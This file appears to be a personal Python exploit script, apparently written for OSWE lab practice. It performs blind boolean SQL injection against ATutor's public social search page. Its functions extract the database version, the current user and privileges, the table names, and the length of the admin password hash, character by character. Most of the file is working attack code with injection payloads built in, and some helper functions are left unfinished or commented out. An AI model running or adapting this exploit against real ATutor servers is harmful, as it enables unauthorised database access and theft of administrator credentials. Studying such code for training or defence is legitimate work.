import requests
import sys
# original query: SELECT * FROM AT_members M WHERE (first_name LIKE '%aaa%'  OR second_name LIKE '%aaa%'  OR last_name LIKE '%aaa%'  OR login LIKE '%aaa%'  )
# SELECT IF(1=1,(SELECT length(current_user()) > 0),'a');
# SELECT IF(1=1,(SELECT length(current_user()) > 14),'a');
# sudo apt proxy install php5-xdebug is all awe need


def searchFriends_blind(ip, sub_query, debug=False):
    injection_string_truthy = F"test')/**/or/**/(select/**/if(1=1,({sub_query}),1))%23"
    #injection_string_falsy = F"test')/**/or/**/(select/**/if(1=2,({sub_query}),1))%23"
    target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string_truthy}"
    #print(target)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    if debug == True:
        print("content length:", content_length)
        print ("reponse", r.content)

    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content lenght is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False
 
def extractDBVersion(ip):
    # injection_string = "test')/**/or/**/(select/**/if(1=1,(select/**/ascii(substring((select/**/version()),1,1))=53),1))"
    for i in range(1,20):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/version()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    print("\n(+) done")
def extractCurrentUserNameLength(ip):
    for i in range(0,32):
        sub_query = F"select/**/length(user())={i}"
        if(searchFriends_blind(ip,sub_query)):
            print("\n(+) Curent user's username is ", i, "characters long.")
            return i
def extractCurrentUsername(ip, username_length):
    username = ''
    for i in range(1,username_length+1):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/current_user()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                username += chr(j)
    print("\n(+) Current DB user is: ", username)   
    print("\n(+) done")
    return username
def currentUserIsDbAdmin(ip, username):
    sub_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
    if(searchFriends_blind(ip,sub_query, debug=False)):
        print(F"\n(+) Current DB user {username} has Super Privilege")
    else:
        print(F"\n(+) Current DB user {username} does NOT have Super Privilege")

def getNumberOfTables(ip, lowerbound, upperbound):
    for i in range(lowerbound, upperbound):
        sub_query = F"SELECT/**/(SELECT/**/COUNT(table_name)/**/FROM/**/information_schema.tables)/**/=/**/{i}"
        if(searchFriends_blind(ip,sub_query)):
            print("(+) Database has ", i, " tables")
            return i
def getTableNames(ip, num_tables):
    print("(+) Exfiltrating tables")
    table_names = []
    for i in range(0, num_tables):
        # max chars of a table name in mysql is 64,
        # this is the way lazy and causes an excessive number of requests.
        # The proper way would be to extract the length of each table ahead of time but,
        # I'm not in the mood to write it so.
        table_name = ''
        for j in range(1, 65):
            for k in range(32, 126):
                sub_query=F"SELECT/**/ascii(substring((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/limit/**/{i},1),{j},1))={k}"
                if(searchFriends_blind(ip,sub_query,debug=False)):
                    table_name += chr(k)
        table_names.append(table_name)
    print("(+) Exfiltrated tables", table_names)
    return table_names
'''
Realistically instead of a linear search we should use a binary search,
but hey this isn't algorithm analysis.
Note to self it might be practical to have something like that coded up when we do hackerone and oswe exam. Get length is a pretty common operation in exfiltration and reducing the amount of time it takes to search is .... better.
'''
def getLength(ip, sub_sub_query, lowbound, upperbound):
    for i in range(lowbound, upperbound):
        sub_query = F"select/**/length(({sub_sub_query}))={i}"
        if(searchFriends_blind(ip,sub_query,debug=False)):
            print(F"(+)Length of result from expression [{sub_sub_query}]: {i}")
            return i
def getAdminHashes(ip, user, hash_len):
    for i in range(1,hash_len + 1):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/password/**/from/**/AT_admins/**/where login='admin'),1,1))='102'"
'''
def getNumberOfDBAdmins(ip):
    pass
def getDbAdmins(ip, num_admins):
    db_admins = []
    for i in range(0, num_admins):
        username = ''
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/current_user/**/from/**/mysql.user/**/where Super_priv='Y'/**/limit 1),1,1))/**/={j}"
            if(searchFriends_blind(ip,sub_query)):
                username += chr(j)
    pass

'''
'''
# old shit
def extractDBCurrentUserNameLengthOLD(ip):
    # mysql usernames were increased from 16 to 32 in version 8.0
    # its also worth mentioning that operating system user names can be longer depending on the OS, so 32 is a soft limit.
    # ideally this value should be changed after determining the version of mysqlr
    for i in range(0,32): 
        injection_string = F"test%27)/**/or/**/(select/**/if(1=1,(select/**/length(user())>{i}),'a'))%23"
        target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string}"
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length < 180):
            print ("user name length is: ", i)
            break
def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        print(target)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None
def extractDBVersionOld(ip):
    print("(+) Retrieving database version....")
    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")


def extractDBUser(ip):
    print("(+) Retrieving database current user....")
    for i in range(1, 16):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")
def extractDBUserPrivs(ip):
    print("(+) Retrieving database user privs....")
    for i in range(1,1000):
        injection_string = "test')/**/or/**/(ascii(substring((show/**/grants/**/for/**/user()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")
'''
def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    #extractDBVersion(ip)
    #username_length = extractCurrentUserNameLength(ip)
    #extractCurrentUsername(ip,username_length)
    #currentUserIsDbAdmin(ip,'root@localhost')
    #num_tables = getNumberOfTables(ip,0,250)
    #getTableNames(ip, num_tables)
    admin_hash = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
    getLength(ip,admin_hash, 1, 100)
    
if __name__ == "__main__":
    main()